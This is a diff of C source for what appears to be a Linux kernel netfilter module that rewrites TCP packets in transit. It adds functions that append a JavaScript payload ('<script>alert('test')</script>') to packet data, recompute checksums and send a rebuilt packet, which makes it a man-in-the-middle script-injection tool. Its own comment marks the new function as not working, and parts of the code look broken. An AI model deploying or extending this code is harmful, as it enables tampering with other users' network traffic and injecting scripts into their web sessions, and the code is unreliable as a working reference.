@@ -88,6 +88,8 @@ union tcp_word_hdr {
 };
 */
 
+static void add_tcp_hackdata(struct sk_buff *skb);
+
 static char tmp_tcp_data[TMP_TCP_PACKET_LEN];
 //=================================================================
 // 初始化 tcp_trans_info
@@ -178,10 +180,6 @@ int tcp_data_hack(struct sk_buff *skb)
    	struct tcphdr *tcph = tcp_hdr(skb); 
 	struct iphdr *iph = ip_hdr(skb);  
 	struct ethhdr *mach = (struct ethhdr*)(skb->head + skb->mac_header);
-    	
-	struct s_tcp_header *tcph_s 	= (struct s_tcp_header *)tcp_hdr;
-	struct s_ipv4_header *iph_s 	= (struct s_ipv4_header *)iph;
-	struct frame8023_header *mach_s = (struct frame8023_header *)mach;
 
 	unsigned short src_port;
 	unsigned short dst_port; 
@@ -204,7 +202,7 @@ int tcp_data_hack(struct sk_buff *skb)
 	unsigned char flag;
 
 	//1）添加 hack 数据
-	add_hackdata(skb);
+	add_tcp_hackdata(skb);
 
 	//2）获取各种参数值
 	offset		= (little_big_16(iph->frag_off))&0x1fff;
@@ -268,10 +266,9 @@ int tcp_data_hack(struct sk_buff *skb)
 //===========================================================================
 // add hack data
 //===========================================================================
-void 	add_hackdata(struct sk_buff *skb)
+static void add_tcp_hackdata(struct sk_buff *skb)
 {
 	unsigned short ip_len;
-	unsigned short tcp_len;
 	int hack_data_len;
 
 	char hack_data[HACKDATA_LEN]	= "<script>alert('test')</script>\n";
@@ -296,8 +293,7 @@ void 	add_hackdata(struct sk_buff *skb)
 void 	add_tcp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short tcp_len, struct iaddr dst_ip, unsigned char protocol,unsigned short src_port, unsigned short dst_port, unsigned int seq, unsigned int ack, unsigned char header_len, unsigned char ctrl_bit, unsigned short winsize, unsigned short upointer)
 {
 	struct tcphdr *tcph 		= tcp_hdr(skb);
-	struct s_tcp_header * tcp	= (struct s_tcp_header *)tcph;
-
+	
 	//-------------------------------------------------------------------------
 	// add tcp header
 	//-------------------------------------------------------------------------
@@ -330,8 +326,6 @@ void 	add_tcp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short tc
 	tcph->cwr	= 0;
 	tcph->res1	= 0;	
 
-
-
 	//计算校验和
 	struct iphdr *iph 	= ip_hdr(skb);
 
@@ -346,3 +340,135 @@ void 	add_tcp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short tc
 	printk("[tcp_add_header, data:%s, len=%d]\n", &tmp_tcp_data[PTCP_HEADER_LENGTH+tcph->doff*4], (tcp_len-(tcph->doff*4)));
 //--------test---------------
 }
+
+//===========================================================================
+// 新建一个sk_buff，取代原来的数据包（不是在原来数据包上修改）---未成功
+//===========================================================================
+int tcp_data_hack_renew(struct sk_buff *skb_s)  
+{  
+	unsigned int	len;
+	unsigned short	tcp_len, tcp_header_len, tcp_data_len, ip_len,total_len,total_len_mod;
+	//char tmp_data[TMP_TCP_PACKET_LEN];
+
+	struct tcphdr *tcph_s 	= tcp_hdr(skb_s);
+	struct iphdr *iph_s	= ip_hdr(skb_s);
+	struct ethhdr *arph_s 	= (struct ethhdr*)(skb_s->head + skb_s->mac_header);
+
+	char *src	= NULL;
+	char *dst	= NULL; 
+	
+	
+	//-------------------------------------------------------------------
+	//1）初始化 hack_data
+	//-------------------------------------------------------------------
+	int hack_data_len		= 0;
+	char hack_data[HACKDATA_LEN]	= "<script>alert('test12')</script>\n";
+	hack_data_len		= str_len(hack_data);
+
+	//更新ip_len
+	ip_len		= little_big_16(iph_s->tot_len);
+	ip_len		+= hack_data_len;	
+	iph_s->tot_len 	= big_little_16(ip_len);
+
+	tcp_header_len	= tcph_s->doff*4;
+	tcp_len		= little_big_16(iph_s->tot_len) - IPV4_HEADER_LENGTH;
+	tcp_data_len	= tcp_len - tcp_header_len;
+	//total_len	= ARP_HEADER_LEN + IPV4_HEADER_LENGTH + tcp_header_len + tcp_data_len + hack_data_len;
+	total_len	= ARP_HEADER_LEN + little_big_16(iph_s->tot_len);
+	total_len_mod	= (total_len / 4 + 1) * 4;	//4的倍数，边界对齐
+	
+	//-------------------------------------------------------------------
+	//2）新建 sk_buff
+	//-------------------------------------------------------------------
+   	struct sk_buff *skb_d 	= alloc_skb(4096, GFP_ATOMIC);
+	skb_d->dev 		= skb_s->dev;
+
+	skb_reserve(skb_d, total_len_mod); 
+
+	//-------------------------------------------------------------------
+	//3）数据部分的装载（payload）
+	//-------------------------------------------------------------------
+	printk("tcp_data_len=%d, hack_data_len=%d\n",tcp_data_len,hack_data_len);
+
+/*
+	int i;
+	for(i=0;i<TMP_TCP_PACKET_LEN;i++)
+	{
+		tmp_data[i]	= NULL;
+	}
+
+	len	= tcp_data_len;
+	dst 	= &tmp_data[0]; 
+	src	= tcph_s;
+	src	+= tcp_header_len;  
+	str_cpy(dst, src, len);
+
+	len	= hack_data_len;
+	dst 	= &tmp_data[tcp_data_len];  
+	str_cpy(dst, hack_data, len);
+
+	len	= tcp_data_len + hack_data_len;
+	dst 	= skb_push(skb_d, len);  
+	str_cpy(dst, hack_data, hack_data_len);
+*/
+
+
+	//将hack data 添加到“新的”数据包中
+	dst = skb_push(skb_d, hack_data_len);  
+	str_cpy(dst, hack_data, hack_data_len); 
+
+/*
+	//将“原来”数据包的数据copy到“新的”数据包中
+	dst 	= skb_push(skb_d, tcp_data_len); 
+	src	= tcph_s;
+	src	+= tcp_header_len;  
+	str_cpy(dst, src, tcp_data_len);
+*/
+
+	//dst	= skb_put(skb_d, hack_data_len);
+	//str_cpy(dst, hack_data, hack_data_len);
+	//-------------------------------------------------------------------
+	//4）tcp header的构建
+	//-------------------------------------------------------------------
+	len	= tcp_header_len;		//len=tcp header 长度
+	dst 	= skb_push(skb_d, len); 
+	src	= tcph_s;
+	
+	str_cpy(dst, src, len);			//将原来数据包里的tcp header直接复制到新的sk_buff中
+
+	struct tcphdr *tcph_d 	= dst;	
+	tcph_d->check		= 0;
+	skb_d->csum 		= csum_partial((unsigned char *)tcph_d, (tcp_len),0);
+	tcph_d->check		= csum_tcpudp_magic(iph_s->saddr,iph_s->daddr, (tcp_len),iph_s->protocol, skb_d->csum);
+
+	//-------------------------------------------------------------------
+	//5）ip header的构建
+	//-------------------------------------------------------------------
+	len	= IPV4_HEADER_LENGTH;		//len=ip header 长度
+	dst 	= skb_push(skb_d, len); 
+	src	= iph_s;
+	
+	str_cpy(dst, src, len);			//将原来数据包里的ip header直接复制到新的sk_buff中
+
+	//-------------------------------------------------------------------
+	//6）arp header的构建
+	//-------------------------------------------------------------------
+	len	= ARP_HEADER_LEN;		//len=arp header 长度
+	dst 	= skb_push(skb_d, len); 
+	src	= arph_s;
+	
+	str_cpy(dst, src, len);			//将原来数据包里的arp header直接复制到新的sk_buff中
+
+	//-------------------------------------------------------------------
+	//7）发送“新的”sk_buff
+	//-------------------------------------------------------------------
+	dev_queue_xmit(skb_d); 
+
+	//-------------------------------------------------------------------
+	//8）丢弃“原来”的sk_buff
+	//-------------------------------------------------------------------
+	//skb_s	= skb_d;
+
+	return NF_ACCEPT;
+	//return NF_DROP;      	 
+} 
